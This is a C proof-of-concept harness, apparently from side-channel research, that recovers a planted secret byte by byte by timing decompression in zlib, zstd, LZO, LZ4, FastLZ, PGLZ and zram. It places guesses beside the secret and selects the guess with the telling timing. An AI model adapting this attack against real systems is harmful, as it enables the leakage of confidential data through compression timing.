#include <stdio.h>
#include "cacheutils.h"
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <sched.h>
#include <assert.h>
#include <signal.h>

#include <time.h>

#undef MIN_MATCH
#define MIN_MATCH 6

#define PAGE_SIZE 4096

#ifdef ZLIB_NG
#include <zlib-ng.h>
#if ZLIB_NG == 1
#define uncompress2 zng_uncompress2
#define uncompress zng_uncompress
#define compress2 zng_compress2
#define compress zng_compress
#endif
#else
#include <zlib.h>
#endif

unsigned char* evict_addr = NULL;

//#define SECRET "NOPENO"
#define REPEAT 15

#define CONTROLLED_AREA_START 0x7c
#define CONTROLLED_AREA_END 0x1000

//00 00 50 00
//00 00 00 00
//00 00 11 0e
//00 00 00 00 00 00
// unsigned char SUFFIX[SUFFIX_LEN] = {
//     0x0,0x0,0x50,0x0,
//     0x0,0x0,0x0,0x0,
//     0x0,0x0,0x11,0x0e
//     0x0,0x0,0x0,0x0,0x0
// };

//#define IS_PREFIX 1
#define SECRET_LEN 10


#ifdef IS_PREFIX
#define PREFIX_LEN 8
unsigned char PREFIX[PREFIX_LEN] = {
    0xff,0xff,0xf7,0xff,0xff,0xff,0xf7,0xff
};

unsigned char SECRET[SECRET_LEN] = {
    0xe1,0x30,0x28,0x08
};
#else

#define SUFFIX_LEN 10
// 
unsigned char SUFFIX[SUFFIX_LEN] = {
    0x0,0x0,
    0x2,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
    // 0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
    // 0x0,0x0,0x0,0x0,0x5,0x22,0x04,0x08,
};

unsigned char SECRET[SECRET_LEN] = {
    0x30, 0xa0, 0x9d, 0x00, 0xc4,0x2c
    //0x28,0x3c,0x0,0x0,0x70,0x5f,0x9d,0x0,0x28,0x3c
};

unsigned char SECRET_REV[SECRET_LEN] = {
    0x2c,0xc4,0x00,0x9d,0xa0,0x30
};
#endif 

#define REPS 3

#define NUMBER_OF_GUESSES 10

#ifdef ZRAM
#define MEM_SZ (1024*60)
#define THRESHOLD_OUTLIER (200000)

char __attribute__((aligned(4096))) mem_array[MEM_SZ];

// Stream through small array to fill DRAM of cgroup
// & evict any remnants of rand_mem & comp_mem to zram  
size_t flush_mem_to_swap() 
{
  int result  = 0; 
  for(int i=0; i< MEM_SZ; i+=64){
    result += mem_array[i]; 
  }
  return (0.000001*result/1024/1024/1024);
}

size_t flush_mem_to_swap_alt() 
{
  int result  = 0; 
  for(int i=0; i< MEM_SZ; i+=64){
    result += evict_addr[i]; 
  }
  return (0.000001*result/1024/1024/1024);
}
//Measure Latency of accesses to the beginning of the array.
size_t testZRAM(uint8_t* in, long unsigned int comprLen, long unsigned int uncomprLen,int level)
{
  uint8_t* arr = in;
  size_t start=0,end=0;
  size_t min_val = -1;


  //Initialize the FlushMem
  for(int i = 0; i < MEM_SZ;i++)  {
    mem_array[i] = rand() % 256;
  }  

  //Test
  size_t result = 0;
  for(int i = 0; i < REPEAT; i++) {
    //Flush memory
    result+=flush_mem_to_swap();    
    sched_yield();
    mfence();
    start = rdtsc();
    maccess(arr + 4088);
    end = rdtsc();
    size_t delta = end - start;
    if(delta < THRESHOLD_OUTLIER){
      if(delta < min_val) min_val = delta;
    }
  }  
  sleep(result/REPEAT);
  return min_val;
}
#endif


//ZLIB Block
#ifdef ZLIB
#include <zlib.h>
#endif

#if defined(ZLIB) || defined(ZLIBNG)
#define CHECK_ERR(err, msg)                              \
{                                                    \
    if (err != Z_OK)                                 \
    {                                                \
        fprintf(stderr, "%s error: %d\n", msg, err); \
    }                                                \
}

size_t testZlib(uint8_t *in, long unsigned int comprLen, long unsigned int uncomprLen,int level) 
{
    size_t compress_t = 0, uncompress_t = 0, ct_min = -1, uct_min = -1;
    uint64_t compress_start = 0, compress_end = 0;
    uint64_t decompress_start = 0, decompress_end = 0;
    uint8_t *compr, *uncompr;
    compr = (uint8_t*)calloc((uInt)comprLen, 1);
    uncompr = (uint8_t*)calloc((uInt)uncomprLen, 1);
    
    int err;
    uint32_t len = comprLen;
        
    compress_start = rdtsc();
    err = compress2(compr, &comprLen, (const Bytef *)in, len,level);
    compress_end = rdtsc();
    CHECK_ERR(err, "compress");
    sched_yield();
    //printf("Len:%zu\n",comprLen);
    for (int i = 0; i < REPEAT; i++)
    {

        decompress_start = rdtsc();
        err = uncompress(uncompr, &uncomprLen, compr, comprLen);
        decompress_end = rdtsc();

        CHECK_ERR(err, "uncompress");

        size_t c_delta = compress_end - compress_start, uc_delta = decompress_end - decompress_start;
        compress_t += c_delta;
        uncompress_t += uc_delta;
        if (c_delta < ct_min)
            ct_min = c_delta;
        if (uc_delta < uct_min)
            uct_min = uc_delta;
    }

    CHECK_ERR(err, "uncompress");
    free(compr);
    free(uncompr);
    return uct_min;
}

#endif

//ZSTD
#ifdef ZSTD
#include <zstd.h>
#define CHECK(cond, ...)                        \
    do {                                        \
        if (!(cond)) {                          \
            fprintf(stderr,                     \
                    "%s:%d CHECK(%s) failed: ", \
                    __FILE__,                   \
                    __LINE__,                   \
                    #cond);                     \
            fprintf(stderr, "" __VA_ARGS__);    \
            fprintf(stderr, "\n");              \
            exit(1);                            \
        }                                       \
    } while (0)

/*! CHECK_ZSTD
 * Check the zstd error code and die if an error occurred after printing a
 * message.
 */

#define CHECK_ZSTD(fn, ...)                                      \
    do {                                                         \
        size_t const err = (fn);                                 \
        CHECK(!ZSTD_isError(err), "%s", ZSTD_getErrorName(err)); \
    } while (0)

size_t testZstd(uint8_t* in, long unsigned int comprLen, long unsigned int uncomprLen,int level)
{
    size_t compress_t = 0, uncompress_t = 0, ct_min = -1, uct_min = -1;
    uint64_t compress_start = 0, compress_end = 0;
    uint64_t decompress_start = 0, decompress_end = 0;
    uint8_t *compr, *uncompr;
    
    size_t compr_bound = ZSTD_compressBound(comprLen);
    compr = (uint8_t*)calloc((unsigned int)compr_bound, 1);

    int err;
    long unsigned int len = comprLen;
        
    compress_start = rdtsc();
    //first out params then in
    size_t const cSize = ZSTD_compress(compr,compr_bound,in,(size_t)comprLen,level);
    compress_end = rdtsc();
    CHECK_ZSTD(cSize);

    unsigned long long const rSize = ZSTD_getFrameContentSize(compr,cSize);
    uncompr = (uint8_t*)calloc((unsigned int)uncomprLen, 1);

    sched_yield();

    for (int i = 0; i < REPEAT; i++)
    {
        decompress_start = rdtsc();
        size_t const dSize = ZSTD_decompress(uncompr,rSize,compr,cSize);
        decompress_end = rdtsc();
        CHECK_ZSTD(dSize);

        size_t c_delta = compress_end - compress_start, uc_delta = decompress_end - decompress_start;
        compress_t += c_delta;
        uncompress_t += uc_delta;
        if (c_delta < ct_min)
            ct_min = c_delta;
        if (uc_delta < uct_min)
            uct_min = uc_delta;
    }

    free(compr);
    free(uncompr);
    return uct_min;
}
#endif


//LZO
#ifdef LZO
#include <lzo/lzo1x.h>

#ifndef IN_LEN
#define IN_LEN 4096 //(128 * 1024L)
#endif
#define OUT_LEN (IN_LEN + IN_LEN / 16 + 64 + 3)

#define CHECK_LZO(err, msg)                              \
{                                                    \
    if (err != LZO_E_OK)                                 \
    {                                                \
        fprintf(stderr, "%s error: %d\n", msg, err); \
    }                                                \
}

size_t testLzo(uint8_t* in, long unsigned int comprLen, long unsigned int uncomprLen,int level)
{
    size_t compress_t = 0, uncompress_t = 0, ct_min = -1, uct_min = -1;
    uint64_t compress_start = 0, compress_end = 0;
    uint64_t decompress_start = 0, decompress_end = 0;
    uint8_t *compr, *uncompr;

    //TODO: there are also other modess
    // LZO1X_999_MEM_COMPRESS,LZO1X_1_15_MEM_COMPRESS,LZO1X_1_12_MEM_COMPRESS,LZO1X_1_11_MEM_COMPRESS
    void* wrkmem = (void*)malloc(LZO1X_1_12_MEM_COMPRESS);
    
    compr = (uint8_t*)calloc(comprLen, 1);

    int err;
    
    
    compress_start = rdtsc();
    //first out params then in
    err = lzo1x_1_compress(in,comprLen,compr, &uncomprLen, wrkmem);
    compress_end = rdtsc();
    CHECK_LZO(err,"compress");

    size_t out_len = comprLen + comprLen / 16 + 64 + 3;
    printf("%zu\n",out_len);
    uncompr = (uint8_t*)calloc(out_len, 1);

    long unsigned int new_len = comprLen;
    sched_yield();
    
    for (int i = 0; i < REPEAT; i++)
    {
        decompress_start = rdtsc();
        err = lzo1x_decompress(compr,uncomprLen,uncompr,&new_len,NULL);
        decompress_end = rdtsc();
        CHECK_LZO(err,"decmopress");

        size_t c_delta = compress_end - compress_start, uc_delta = decompress_end - decompress_start;
        compress_t += c_delta;
        uncompress_t += uc_delta;
        if (c_delta < ct_min)
            ct_min = c_delta;
        if (uc_delta < uct_min)
            uct_min = uc_delta;
    }
    free(wrkmem);
    free(compr);
    free(uncompr);
    return uct_min;
}
#endif

#ifdef FASTLZ
#include "../libraries/FastLZ/fastlz.h"

size_t testFastlz(uint8_t* in, long unsigned int comprLen, long unsigned int uncomprLen,int level)
{
    size_t compress_t = 0, uncompress_t = 0, ct_min = -1, uct_min = -1;
    uint64_t compress_start = 0, compress_end = 0;
    uint64_t decompress_start = 0, decompress_end = 0;
    uint8_t *compr, *uncompr;

    int compress_level = 2;

    compr = (uint8_t*)calloc(comprLen, 1);
    uncompr = (uint8_t*)calloc(comprLen * 10, 1);
    int err;

 
    compress_start = rdtsc();
    size_t chunk_size = fastlz_compress_level(compress_level,in,comprLen,compr);
    compress_end = rdtsc();



    unsigned int new_len = comprLen;
    sched_yield();

    for (int i = 0; i < REPEAT; i++)
    {
        decompress_start = rdtsc();
        size_t size_decompressed = fastlz_decompress(compr,chunk_size,uncompr,comprLen*2);
        decompress_end = rdtsc();

        size_t c_delta = compress_end - compress_start, uc_delta = decompress_end - decompress_start;
        compress_t += c_delta;
        uncompress_t += uc_delta;
        if (c_delta < ct_min)
            ct_min = c_delta;
        if (uc_delta < uct_min)
            uct_min = uc_delta;
    }

    //free(compr);
    //free(uncompr);
    return uct_min;
}

#endif

#ifdef LZ4
#include <lz4.h>

size_t testLZ4(uint8_t* in, long unsigned int comprLen, long unsigned int uncomprLen,int level)
{
    size_t compress_t = 0, uncompress_t = 0, ct_min = -1, uct_min = -1;
    uint64_t compress_start = 0, compress_end = 0;
    uint64_t decompress_start = 0, decompress_end = 0;
    uint8_t *compr, *uncompr;

    const int max_dst_size = LZ4_compressBound(comprLen);

    compr = (uint8_t*)calloc(max_dst_size, 1);
    uncompr = (uint8_t*)calloc(comprLen * 10, 1);
    int err;

 
    compress_start = rdtsc();
    const int compressed_data_size = LZ4_compress_default(in,compr,comprLen, max_dst_size);
    compress_end = rdtsc();

    unsigned int new_len = comprLen;
    sched_yield();

    for (int i = 0; i < REPEAT; i++)
    {
        decompress_start = rdtsc();
        const int decompressed_size = LZ4_decompress_safe(compr,uncompr,compressed_data_size,comprLen);
        decompress_end = rdtsc();

        size_t c_delta = compress_end - compress_start, uc_delta = decompress_end - decompress_start;
        compress_t += c_delta;
        uncompress_t += uc_delta;
        if (c_delta < ct_min)
            ct_min = c_delta;
        if (uc_delta < uct_min)
            uct_min = uc_delta;
    }

    free(compr);
    free(uncompr);
    return uct_min;
}

#endif

#ifdef PGLZ
#include "pg_lzcompress.h"
#define REPS 1
size_t testPGLZ(uint8_t* in, long unsigned int comprLen, long unsigned int uncomprLen,int level) {
    size_t compress_t = 0, uncompress_t = 0, ct_min = -1, uct_min = -1;
    uint64_t compress_start = 0, compress_end = 0;
    uint64_t decompress_start = 0, decompress_end = 0;
    uint8_t *compr, *uncompr;

    /*
     * Figure out the maximum possible size of the pglz output, add the bytes
     * that will be needed for varlena overhead, and allocate that amount.
     */
    char *tmp = (char *) calloc(PGLZ_MAX_OUTPUT(uncomprLen), 1);
    /* allocate memory for the uncompressed data */
    char *result = (char *) calloc(uncomprLen, 1);

    compress_start = rdtsc();
    int32 _comprLen = pglz_compress(in,
                        uncomprLen,
                        tmp,
                        PGLZ_strategy_default);
    compress_end = rdtsc();
    // compression succeeds only with at least a byte saved
    if(_comprLen < 0)
        return -1;
    comprLen = (unsigned long)_comprLen;

    sched_yield();
    for (int i = 0; i < REPEAT; i++)
    {
        decompress_start = rdtsc();
        int32 rawsize = pglz_decompress(tmp,
                                comprLen,
                                result,
                                uncomprLen, true);
        decompress_end = rdtsc();
        assert(rawsize == uncomprLen);

        size_t c_delta = compress_end - compress_start, uc_delta = decompress_end - decompress_start;
        compress_t += c_delta;
        uncompress_t += uc_delta;
        if (c_delta < ct_min)
            ct_min = c_delta;
        if (uc_delta < uct_min)
            uct_min = uc_delta;
    }

    free(tmp);
    free(result);
    return uct_min;
}
#endif


#define CHECK_ERR(err, msg)                              \
    {                                                    \
        if (err != Z_OK)                                 \
        {                                                \
            fprintf(stderr, "%s error: %d\n", msg, err); \
        }                                                \
    }

unsigned char** create_dict(size_t guess_len,size_t num_of_guesses)
{
  // not sure if this influences our generation of the initial page with the 
  // rand modulus
  srand(time(NULL));
  unsigned char** dict = (unsigned char**) calloc(sizeof(char*) * num_of_guesses,1);

  int rand_idx = rand() % num_of_guesses;

  for(int i = 0; i < num_of_guesses; i++)
  {
    dict[i] = calloc(sizeof(unsigned char) * guess_len  + 1,1);

    //reversed in this case as we have a SUFFIX leakage
    #ifdef IS_PREFIX
    memcpy(dict[i],SECRET,guess_len);
    #else
    for(int k =0; k < guess_len;k++)
    {
        dict[i][k] = SECRET_REV[guess_len - 1 - k];
    }
    #endif

    if(i == rand_idx)
    {
      //SECRET
      #ifdef IS_PREFIX
      dict[i][guess_len - 1] = SECRET[guess_len - 1];
      #else
      dict[i][0] = SECRET_REV[guess_len - 1];
      #endif
    }
    else
    {
      //RANDOM GUESS
      unsigned char char_guess = (unsigned char) rand() % 256;
      #ifdef IS_PREFIX
      dict[i][guess_len - 1] = char_guess;
      #else
      dict[i][0] = char_guess;
      #endif
    }
  }
  return dict;
}

void free_dict(unsigned char** dict,size_t guess_len,size_t num_of_guesses)
{
  // not sure if this influences our generation of the initial page with the 
  // rand modulus
  for(int i = 0; i < num_of_guesses; i++)
  {
    free(dict[i]);
  }
  free(dict);
}

static const char* const SCHEDULE[] = {
	/* Batch */
	"uops_issued.any",
	"dTLB-load-misses",
	"dTLB-store-misses",
	"branch-misses"
};
static const int NUMCOUNTS = sizeof(SCHEDULE)/sizeof(*SCHEDULE);

int main(int argc, char *argv[])
{
    uLong comprLen = 0, uncomprLen = 0, filesize = 0; // * sizeof(int); /* don't overflow on MSDOS */
    struct stat st;
    int fd = -1;
    int rc = 0;
    size_t size = 0;
    
    /*
    int fd_evict = open("/opt/google/chrome/chrome",O_RDONLY);
    if (fd_evict < 3)
    {
      printf("error: failed to open file\n");
      return 2;
    }    
    evict_addr = (unsigned char*)mmap(0,MEM_SZ, PROT_READ, MAP_SHARED, fd_evict, 0);
    */
    if (argc < 5 || argc > 9)
    {
        printf("Usage: %s [random_memory] [offset_secret] [offset_guess] [guess_length] [compression_level] [number_of_secrets] [Initial Page Guess Modulues] [Fill pages]\n", argv[0]);
        return 1;
    }   
    
    // set compression level
    int level = 6; // 6 is default compression level
    if (argc >= 6)
    {
        level = atoi(argv[5]);
        if (level < 1 || level > 9)
        {
            printf("ERR: compression level must be 1...9\n");
            return 1;
        }
    }
    
    // set number of times secret is placed
    int numberSecret = 1; // default
    int rand_modulus = 50; // default
    size_t nr_fill_pages = 0;
    if(argc >= 7)
      numberSecret = atoi(argv[6]);
    if (argc >= 8)
    {
      //rand_modulus = atoi(argv[7]);
    }

    if(argc >= 9)
    {
      nr_fill_pages = (size_t)atoi(argv[8]);
    }

    int spaceBetweenGuesses = 1; // default
    // TODO: read from args?

    // if (ptedit_init())
    // {
    //     printf(TAG_FAIL "Error: Could not initalize PTEditor, did you load the kernel module?\n");
    //     return 1;
    // }

    int offsetSecret = atoi(argv[2]);
    int offsetGuess = atoi(argv[3]);
    int lengthGuess = atoi(argv[4]);


    //generate a dictionary for the number of guesses
    unsigned char** dict = create_dict(lengthGuess,NUMBER_OF_GUESSES);

    if (lengthGuess <= 0 || lengthGuess > SECRET_LEN) // this assumes all entries in dict are same length
    {
        printf("Invalid guess length\n");
        return -1;
    }

    fd = open(argv[1], O_RDWR);

    if (fd == -1)
    {
        puts("Error opening file");
        return -1;
    }

    rc = fstat(fd, &st);
    size = st.st_size;
    // fprintf(stderr, "stat() = %d\n", rc);
    // fprintf(stderr, "size=%zu\n", size);

    unsigned char* input_file = mmap(0,size,PROT_READ | PROT_WRITE, MAP_PRIVATE, fd,0);
    if (input_file == MAP_FAILED)
    {
        close(fd);
        perror("Error mmapping the file");
        exit(EXIT_FAILURE);
    }

    unsigned char* mem = mmap(0,nr_fill_pages*PAGE_SIZE + size,PROT_READ | PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE,0,0);
    
    if (mem == MAP_FAILED)
    {
        perror("Error mmapping mem");
        exit(EXIT_FAILURE);
    }

    //move back original file to offset
    memcpy(mem+nr_fill_pages*PAGE_SIZE,input_file,size);

    // TODO: leave this here - randomize     
    srand(1);
    for (int i = CONTROLLED_AREA_START; i < CONTROLLED_AREA_END; i++)
    {
#ifdef PGLZ
    #define RANDOM_BASE (' ')
#else
    #define RANDOM_BASE (0)
#endif
        mem[i] = (unsigned char)((rand() % rand_modulus) + RANDOM_BASE);
    }

    //take same page additionally n times
    for(int i = 1; i < nr_fill_pages; i++)
    {
      memcpy(mem+i*4096,mem,PAGE_SIZE);
    }

    comprLen = size + (size_t)nr_fill_pages*4096;
    uncomprLen = comprLen;

    //increase start of mem ptr such that it moves to the first page
    //because fuzzer generates data between file size i.e 0-32kB
    char* mem_offset = mem + nr_fill_pages*PAGE_SIZE;

    //PLACE SECRET
    #ifdef IS_PREFIX
    //memcpy(mem_offset + offsetSecret,PREFIX,PREFIX_LEN);
    //memcpy(mem_offset + offsetSecret + PREFIX_LEN,SECRET,SECRET_LEN);
    #else
    //memcpy(mem_offset + offsetSecret,SECRET,SECRET_LEN);
    //memcpy(mem_offset + offsetSecret + SECRET_LEN,SUFFIX,SUFFIX_LEN);
    #endif

    size_t (*compression_lib)(uint8_t*,long unsigned int,long unsigned int,int level) = NULL;

    //printf("[ all random ]\n");
    
    #ifdef ZLIB
    compression_lib = &testZlib;
    #elif ZLIBNG
    compression_lib = &testZlib;
    #elif ZSTD
    compression_lib = &testZstd;
    #elif LZO
    compression_lib = &testLzo;
    #elif FASTLZ
    compression_lib = &testFastlz;
    #elif LZ4
    compression_lib = &testLZ4;
    #elif PGLZ
    compression_lib = &testPGLZ;
    #elif ZRAM
    compression_lib = &testZRAM;
    #else
    printf("library not found"); \
    return -1;
    #endif

    int index = 0;
#ifndef REPS
    #define REPS 1
#endif
    
    for (int k = 0; k < REPS; k++)
    {
      size_t fastest = -1;
      size_t second_fastest = -1;
      size_t slowest = 0;
      size_t second_slowest = 0;
      for (int i = 0; i < NUMBER_OF_GUESSES; i++)
      {
        void* posFirstGuess = mem_offset + offsetGuess;
        for (int tmp = 0; tmp < numberSecret; tmp++)
        {
            
            #ifdef IS_PREFIX
            int posGuess = (tmp * (PREFIX_LEN + lengthGuess + spaceBetweenGuesses));
            memcpy(posFirstGuess + posGuess,PREFIX,PREFIX_LEN);
            memcpy(posFirstGuess + PREFIX_LEN + posGuess,dict[i],lengthGuess);
            #else
            //first secret then suffix
            int posGuess = (tmp * (SUFFIX_LEN + lengthGuess + spaceBetweenGuesses));
            memcpy(posFirstGuess + posGuess, dict[i],lengthGuess);
            memcpy(posFirstGuess + lengthGuess + posGuess,SUFFIX,SUFFIX_LEN);
            #endif
        }

        char filename[40] = "output/"; 
        //memcpy(filename+7,dict[i],LEN_SECRET);
        for(int k = 0; k < lengthGuess;k++)
        {
          sprintf(filename+7+k*2,"%02x",dict[i][k]);
        }
        //printf("%s\n",filename);
        FILE* f2 = fopen(filename,"wb");
        if(f2)
        {
            //printf("Writing %zu\n",size+(size_t)nr_fill_pages*4096);
            fwrite(mem,size+(size_t)nr_fill_pages*4096,1,f2);
            sync();
            fclose(f2);
        }

    	size_t uncompress_time = compression_lib(mem, comprLen, uncomprLen, level);
	
        for(int j = 0; j < lengthGuess; j++)
        {
            printf("%02x", dict[i][j]);
        }
        printf(",%zd\n",uncompress_time);

#ifdef ZRAM
	if (uncompress_time > slowest && uncompress_time != -1){
	  if(slowest != 0)
	    second_slowest = slowest;
	  slowest = uncompress_time;
	  index = i;
	} else if (uncompress_time > second_slowest && uncompress_time != -1) {
	  second_slowest = uncompress_time;
	}	 
#else
        if (uncompress_time < fastest)
        {
            //set second fastest
            if (fastest != -1)
            {
                second_fastest = fastest;
            }
            fastest = uncompress_time;
            index = i;
        }
        else if (uncompress_time < second_fastest)
        {
            second_fastest = uncompress_time;
        }
#endif
      }

      printf("Recovered secret:");
      for(int i = 0; i < lengthGuess;i++)
      {
        printf("%02x",dict[index][i]);
      }
      printf("\n");

#ifdef ZRAM
      printf("Fastest:%zu\nSecond fastest:%zu\n", slowest, second_slowest);	    
      printf("diff fastest to second fastest:%zd\n", slowest - second_slowest);
#else
      printf("Fastest:%zu\nSecond fastest:%zu\n", fastest, second_fastest);
#ifdef PGLZ
      // pglz corner case: if we hit it, we are actually interested on the decompress vs no-decompress diff
      if (fastest != 0xffffffffffffffffuL && second_fastest == 0xffffffffffffffffuL)
        printf("diff fastest to second fastest:%zd\n", fastest);
      else 
#endif
        printf("diff fastest to second fastest:%zu\n", second_fastest - fastest);
      //second_fastest - fastest;
#endif
    }
    // }

    free_dict(dict,lengthGuess,NUMBER_OF_GUESSES);
    close(fd);
    //close(fd_evict);
    //munmap(evict_addr,MEM_SZ); 

    return 0;
}
